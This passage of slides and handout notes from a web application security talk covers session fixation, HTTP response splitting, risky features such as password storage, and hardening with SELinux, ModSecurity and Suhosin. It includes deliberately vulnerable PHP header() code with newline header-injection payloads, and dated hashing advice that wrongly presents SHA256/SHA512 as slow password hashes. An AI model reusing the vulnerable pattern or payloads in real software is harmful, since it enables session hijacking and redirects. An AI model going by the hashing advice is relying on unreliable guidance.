  Session fixation is like session hijacking in reverse. When developers 
  wised up a bit and it became too difficult to hijack sessions, 
  attackers started exploiting the fact that frequently you can force a 
  session identifier onto someone else. The end-result is the same as 
  session hijacking.

  Attacker usually establishes a session first by visiting a site. Then 
  they read the session cookie and trick the victim into assuming that 
  session, for example by clicking a link that contains a 
  ``?PHPSESSID=`` parameter. If the web application does not make sure 
  that session identifiers only come from secure cookies, the victim 
  will continue the attacker's session. Usually the victim then 
  authenticates to the application, and the attacker takes over the 
  session again with victim's permissions.


Cookies: Session fixation fix
-----------------------------
* Re-initialize the session after authentication
* Never accept session identifiers in GET/POST

.. container:: handout

  The way to avoid this is to make sure that you never accept session 
  identifiers in GET/POST, only in secure cookies. For the case of PHP, 
  this means NEVER using `$_REQUEST` and always using `$_COOKIE`.

  Additionally, you can re-initialize the session identifiers after 
  authentication, just to make sure that the identifier is always reset 
  to a new random value.


HTTP Response Splitting
-----------------------
:What: Passing malicious HTTP headers
:How:  Newlines in user content
:Fix:  Strip out newlines

.. container:: handout

  HTTP Response splitting is a fairly new attack and is difficult to 
  exploit. It requires that user-originated content is added to HTTP 
  response headers issued by the application.


HTTP Response Splitting: What
-----------------------------
* Fairly hard to achieve
* Usually to set cookies for session fixation attacks
* Can be also used to redirect client elsewhere

.. container:: handout

  HTTP Response splitting attacks make it appear as if the application 
  issued not one, but several HTTP responses. Since this is perfectly 
  legal in a keepalive connection, the browser interprets them as 
  multiple HTTP responses without throwing any errors. Alternatively, 
  the attacker may simply add extra HTTP headers to one response. All 
  that is required is for the attacker to sneak in a ``\n`` character 
  and then their own HTTP headers (demonstrated below).

  The attacker can use this technique to set cookies (think session 
  fixation attacks), redirect the client elsewhere, or do other 
  malicious things with content that appears to be originating from your 
  domain.


HTTP Response Splitting: How
----------------------------
.. code-block:: php

    <?php
      // setting cookies:
      header("Location: {$_GET['page']}");
      // page=about.php\nSet-cookie:sessid=foo

      // Redirecting:
      header("Set-cookie: name={$_GET['cookie']}");
      // blah\nLocation: http://spamsite.com/

.. container:: handout

  In the above example we demonstrate setting additional headers in a 
  response (no actual response splitting is going on). NB: I think newer 
  PHP actually disallows newline characters in ``header()``, so I don't 
  think this example code will actually work if you try it.


HTTP Response Splitting: Fix
----------------------------
* Be very careful what you put into headers
* Always strip out "``\n``"

.. container:: handout

  The solution is to be very careful about what you put in http headers.  
  Always strip out newlines -- better yet, allow only a small subset of 
  characters to make sure that your headers are clean.


HTTP Request splitting
----------------------
* Attacking the browser
* Usually involves proxies
* HTTP Cache poisoning
* Not much you as site owner can do

  * Unless you do XMLHTTPRequests
  * Filter out newlines

.. container:: handout

  I only include HTTP request splitting into this talk because I know 
  someone will mention it if I don't. As opposed to response splitting, 
  where extra headers are injected into the response headers, the 
  request splitting injects extra http headers into the request. It is 
  tricky to exploit because it requires that the victim uses a forward 
  proxy, and the primary target of this attack is cache poisoning.

  There is nothing you can do to prevent this as a web application 
  developer, other than making sure that your software is not vulnerable 
  to XSS, which can then be used for carrying out HTTP request splitting 
  attacks.


AWOOGA features
---------------
* Encryption
* Password storage
* Forgotten password reset
* Email from site
* File uploads
* Templating
* Search
* Installers

.. container:: handout

  Now that we've covered the major attack vectors that can be used 
  against your web application, let's talk about web app 
  features that require extra scrutiny because they are routinely 
  implemented in an insecure manner. I call them "AWOOGA!" features -- 
  that means that warning sirens should be going off in your head 
  whenever you either consider writing something like that, or when you 
  hear someone say that their software implements one of the "AWOOGA!" 
  features.


AWOOGA: Encryption
------------------
* Encryption is easy to get wrong

  * Symmetric? Asymmetric? AES? CBC?

* "Encrypt data at rest" requirement

  * Key management is very hard
  * Keeping the key with the lock
  * More useful if crypto hardware is used

* Useful if encrypting data passed to the client or 3rd-party

.. container:: handout

  Encryption is a great example of an "AWOOGA" feature because it is so 
  easy to get it wrong. Few people have a good understanding of 
  cryptography, and unfortunately it is one of those areas where limited 
  knowledge unfailingly leads to vulnerable design. In this talk I will 
  concentrate on encryption as implemented in web applications and not 
  on things like HTTPS connections.

  Encryption is easy to get wrong
    Most developers, unless they have actually invested time to learn 
    the basics of cryptography, have very limited understanding of how 
    cryptography works. While most are able to tell a difference between 
    symmetric and asymmetric encryption, more fine details like 
    encryption algorithms and cipher block modes are usually reserved 
    for people to whom cryptography is bread-and-butter. However, if you 
    are implementing cryptography in your application, you *really* 
    ought to invest some time into familiarizing yourself with some core 
    concepts of encryption. There's no lack of good resources on the 
    web.

  "Encrypt data at rest" requirement
    A lot of standards bodies require that data is encrypted both in 
    transition and at rest -- for example, if your software deals with 
    credit cards, your payment processor will require that you comply 
    with the PCI DSS standard. One of the items on the list is that all 
    confidential data is encrypted when it is stored on disk.

    This is one of those requirements that kinda makes you roll your 
    eyes, because what inevitably ends up happening is that the key is 
    stored on the same system as the encrypted data.  There is no way 
    around this -- if the webserver needs to be capable of decrypting 
    the data, it has to have access to the decryption key. True, you 
    have made it more difficult for the attackers to obtain those credit 
    card numbers -- but not by a lot, especially considering the 
    financial reward those attackers will rip once they decrypt the 
    credit cards.

    Encrypting data at rest becomes more useful if hardware encryption 
    mechanisms are used, but still it is only a matter of extra effort 
    for attackers to obtain the decryption key. There is no way around 
    the fact that if the web server needs to be able to decrypt the 
    data, then if the web server is compromised, attackers will be able 
    to decrypt your encrypted data.

    At best, at-rest data encryption is a protection against casual 
    hacker and won't deter hardened criminals.

  Useful when encrypting for 3rd parties
    Encryption is definitely very useful when you are encrypting data to 
    pass to a "3rd party," especially if you have to pass this data to 
    the client for later retrieval. Example would be encrypting some 
    sensitive data in the cookies. Again, you actually need to know what 
    you are doing in order to get it right.


AWOOGA: Password storage
------------------------
* Consider OpenID (Facebook, Google, etc)

  * Make password handling "not your problem"
  * Unless you have valid reasons not to use OpenID

* Do NOT use ``md5sum()`` or ``sha1sum()``

  * Easily defeated with "rainbow tables"

* Use salted passwords
* Fast hashing mechanisms are not well-suited

  * Use ``SHA256`` or ``SHA512``
  * PHP *finally* has a native ``crypt()`` hashing function

.. container:: handout

  Nearly all web applications have to deal with storing account 
  credential information, if only to separate admin users from regular 
  plebs. Very frequently this isn't done right.

  Consider OpenID
    First of all, consider entirely bypassing having to deal with 
    passwords, thus saving yourself effort and potential embarrassment.  
    OpenID has its set of problems, but from the point of view of
    application developer it offloads the problem of dealing with 
    authentication and passwords and makes it someone else's problem.  
    Don't call it "OpenID authentication," because users will simply get 
    confused. Call it "Log in with your Facebook or Google account!"

    There are valid reasons why you wouldn't want to use OpenID -- for 
    example, if the data you are trying to secure shouldn't be sitting 
    behind the same password that people use for their facebook 
    accounts. In that case, read on. If it's an application you wrote 
    for company use, you should be using central authentication anyway 
    -- hence it's already "not your problem."

  Do NOT use ``md5sum()`` or ``sha1sum``
    This is frighteningly the case in lots and lots of web applications.  
    There is inevitably a table in the database called "accounts" which 
    contains a username field, and a password field, which is almost 
    always a ``varchar(32)`` for the md5 hash of the password.

    The trouble is, md5-hashed passwords are easily defeated by 
    so-called "rainbow tables," which are huge lookup tables of hashes 
    and corresponding plaintext strings. Unless it's a really, really 
    good password (and they rarely are), chances are that an md5 hash of 
    it is already in a rainbow table somewhere.

    Even if a password is not in a rainbow table, there are enough 
    weaknesses in md5 and sha1, and plenty of cheap processing power 
    available these days to make brute-force lookups computationally 
    quite feasible, if it's worth the effort for the attacker.

  Use salted passwords
    The annoying thing, this is a problem that has been solved many-many 
    years ago. All sane systems these days use salted passwords, which 
    add a random string to the password before hashing it in order to 
    make it infeasible to use rainbow tables. Don't re-invent the wheel, 
    use a crypto library that provides you with a standard way to hash 
    and salt a password.

  Fast hashing mechanisms are not well-suited
    Remember what I said earlier -- if it's worth it for an attacker to 
    brute-force an md5 password, it's easy enough for them to do it. You 
    actually want to *avoid* using fast hashing mechanisms when 
    calculating password hashes. I know it's an anathema for developers 
    to deliberately pick a slow algorithm for anything, but this makes 
    perfect sense for the purposes of password hashing. You only check a 
    password hash once during a session, so spending 10 ms instead of 1 
    ms on calculating a password hash won't have any impact on your 
    app's responsiveness, but it will make it unfeasible for an attacker 
    to try to brute-force it.

    Use ``sha256`` or even ``sha512``. PHP 5.3 finally has a native 
    ``crypt()`` function that supports new hashing mechanisms -- use it!


AWOOGA: Password resets
-----------------------
* "Personal questions" are backdoors to your system

  * User-chosen "personal questions" are very weak
  * Or they are too hard and users forget them

    * What was my favourite movie 3 years ago?
    * Nobody knows how to spell "fuchsia"
    * Was it "Toyota," "Toyota Pickup," or "Tacoma?"
  
  * Or users defeat them

    * "Dear Mrs. Asdfasdf..."

* Sending password via email?
* Did I mention OpenID?


.. container:: handout

  "Personal questions" are backdoors to your system
    Personal questions are an abomination. It's a poor-man's mechanism 
    of adding a "what-you-know" factor to authentication, and it works 
    just as described -- poorly.

    If users are allowed to pick their own questions, they are 
    inevitably something easily guessable, such as "what is your 
    mother's maiden name?"

    If they are pre-set to be difficult, then users will forget them and 
    you will be back to square 1. They are hard because people's 
    preferences change. I don't remember what my favourite movie was 3 
    years ago when I set up these "personal questions." My favourite 
    colour changes as I get older and crankier, too.

    Nobody knows how to spell "fuchsia." Seriously -- there was an XKCD 
    comic about that.

    Most frustratingly, there is more than one way to answer the same 
    question. My first car was a 91 Toyota Pickup. Did I list it as 
    "Toyota," "Toyota Pickup," "91 Toyota Pickup," or "Tacoma?" They are 
    all valid answers, but not to the computer.

    Because of frustration with personal questions, users have started 
    defeating them by simply answering something like "asdfasdf" to all 
    "personal questions," thus creating a quick backdoor into your 
    carefully engineered system with an otherwise strong password 
    policy.
  
  Sending password change links via email
    This is still the best way to do it, short of actually calling a 
    user on the phone. Don't send actual passwords, of course, send a 
    one-time link where a user can change their password. There's always 
    a chance that a user's email account has been compromised, but at 
    least it's not your problem (unless it is, in which case just have 
    help desk call them).

  Did I mention OpenID?
    Speaking of making it "not your problem" -- this is another thing 
    that you will avoid if you use OpenID.


AWOOGA: Email from site
-----------------------
* Contact forms are spammer paradise

  * Infamous ``formmail.cgi``

* Hard-coding the recipient limits the problem
* "Captchas" help against bots (for now)
* Expiring tokens help against bots
* Beware of cheap copy-pasters from "3rd-world"

  * Use "IP tarpitting" if it gets too bad

.. container:: handout

  *NB: Handout comments to the rest of the talk will be added as time 
  allows*


AWOOGA: File uploads
--------------------
* Do not place uploaded files into web root
* Check file names, if you must do it
* Have a "CYA policy" for malware-infected files

  * Or run a virus-scan on uploaded content


AWOOGA: Templating systems
--------------------------
* Amazing number of them uses ``eval()``
* Those that don't may not properly escape formatting codes from user 
  content


AWOOGA: Search
--------------
* Database-based search

  * Expression parsing may leave you open to SQL injection attacks
  * May expose non-public content

* Crawler solutions

  * Expose non-public content from IP-restricted sites
  * May leave you exposed to shell injection attacks
  * Or DoS attacks, because they are usually slow


AWOOGA: Installers
------------------
* Usually require a directory writable by httpd
* Are usually left undeleted after installation

  * May have full admin access to reconfigure your site
  * May be full of exploits


SELinux: brief introduction
---------------------------
* Mandatory Access Control

  * Difference from "Unix-like" behaviour
  * The parable of beer delivery service

* Roadblocks to SELinux adoption

  * Old-school Unix admins
  * Extra work when doing something "non-standard"


SELinux and web apps
--------------------
* Limited usefulness when running scripts as part of httpd

  * Httpd daemon vulnerabilities
  * Code injection attacks
  * Curious users poking around

* Much more powerful when used with CGI scripts

  * Must do actual ``exec()`` with domain transition, so ``mod_fcgi`` 
    doesn't work (AFAICT)
  * Advanced configuration not covered here


Living with SELinux
-------------------
* Familiarize yourself with SELinux
* Start with ``permissive mode``
* Do not change default file locations

  * Or learn how SELinux file labeling works
  * You may have to anyway

* Learn how to use ``ausearch`` and ``aureport``
* Learn SELinux file contexts and booleans


Essential httpd file contexts
-----------------------------
:``httpd_sys_content_t``:     Read-only website content
:``httpd_sys_rw_content_t``:  Files that can be modified by httpd
:``httpd_sys_script_exec_t``: CGI executables
:``public_content_rw_t``:     Blanket type for all other public content
:``httpd_unconfined_script_exec_t``: For very complex CGI scripts


Setting contexts with semanage
------------------------------
* Do not use ``chcon`` for permanent labels
* To allow httpd to read content in ``/web``:

.. code-block:: sh

  semanage fcontext -a -t httpd_sys_content_t \
    "/web(/.*)?"

* To allow httpd to write to ``/web/config``:

.. code-block:: sh

  semanage fcontext -a -t httpd_sys_rw_content_t \
    "/web/config(/.*)?"


SELinux booleans
----------------
* Booleans are bits of SELinux policy that can be toggled on or off
* To list all httpd-related booleans:
  
.. code-block:: sh

 getsebool -a | grep httpd

* To set a boolean (``-P`` for "persistent"):

.. code-block:: sh

  setsebool -P httpd_can_network_connect_db on


Essential httpd-related booleans
--------------------------------
:``httpd_builtin_scripting``:      Enable mod_php and similar systems
:``httpd_can_network_connect``:    Allow httpd to open network sockets
:``httpd_can_network_connect_db``: Allow httpd to open network socket
                                   to a db server
:``httpd_can_sendmail``:           Allow httpd to invoke sendmail


Essential httpd booleans (contd)
--------------------------------
:``httpd_enable_cgi``:      Allow httpd to execute CGI scripts
:``httpd_enable_homedirs``: Allow httpd to access user content in
                            ``~/public_html``
:``httpd_tty_comm``:        Allow httpd access to tty
                            (passphrase-protected SSL certificates)


Writing your own policies
-------------------------
* Find audit deny logs that you want to address
* Make use of ``audit2why`` and ``audit2allow``

.. code-block:: sh

  ausearch -m avc -ts today -r | audit2why

* Run in permissive to collect all AVCs


ModSecurity: what it is
-----------------------
* "Application firewall"
* Analysis of HTTP traffic at the Apache level

  * Restrict HTTP methods
  * Analyze and enforce payload compliance
  * Stop attacks before they get to your web apps


ModSecurity: what it is NOT
---------------------------
* NOT a magic wand that makes you secure
* NOT for the lazy
* NOT for the faint of heart
* 3rd-party app owners will NOT be amused


Paranoid vs. Heuristic approach
-------------------------------
* Write your own rules from scratch
* Use pre-written rules in "paranoid mode"
* Use a combination of both
* Use pre-written rules with "threshold scoring"


ModSecurity: paranoid approach
------------------------------
* Write rules from scratch

  * Allows you to enforce payload schemas
  * Not suitable for large existing apps

* Pre-written rules in "paranoid mode"

  * "Password may not contain the word SELECT"


ModSecurity: Heuristic approach
-------------------------------
* Understand security thresholds
* Review and understand pre-written rules

  * Let's take a look now
  * ``/etc/httpd/modsecurity.d``


ModSecurity: tweaking rules
---------------------------
* Avoid modifying default rules

  * Upgrades will become a mess

* Use ``SecRuleRemoveById`` for blunt tweaks
* Use ``TX:`` variables for fine-tuning

  * Decrease score based on various criteria

PHP: mod_suphp
--------------
* Will execute php scripts with file owner rights

  * Excluding anything below userid < 500 (configurable)

* Can ``chroot`` php scripts before executing

  * Can ``chroot`` to ``$HOME``

* Perfect tool for multi-site hosting


Hardened PHP: Suhosin
---------------------
* 수호신 means "Guardian Angel"
* Offers a patch and an add-on module

  * Patch is for bad code in PHP itself
  * Add-on offers extra protection


Suhosin: Add-on features
------------------------
* Cookie and session data encryption

  * Can use USER_AGENT or REMOTE_ADDR octets
  * Transparent operation

* Disallow ``include()`` of uploaded files
* Disable ``eval()`` or other functions
* Set maximum recursion depth
* Set maximum GET/POST/COOKIE value limits
* Really disable ``include()`` of remote files


Tools
-----
* Most "vulnerability scanners" will only check for known 
  vulnerabilities or known outdated software

  * Nikto scanner

* Ratproxy

  * Analyzes traffic and offers suggestions
  * Can do SSL


Summary
-------
* All security is trade-off in terms of:

  * Effort
  * Money
  * Usability

* Know that you are made of meat

  * Your boss and co-workers are made of meat, too

* Be prepared when things fail

  * Use multiple layers of security


Q&A?
----
* Questions?
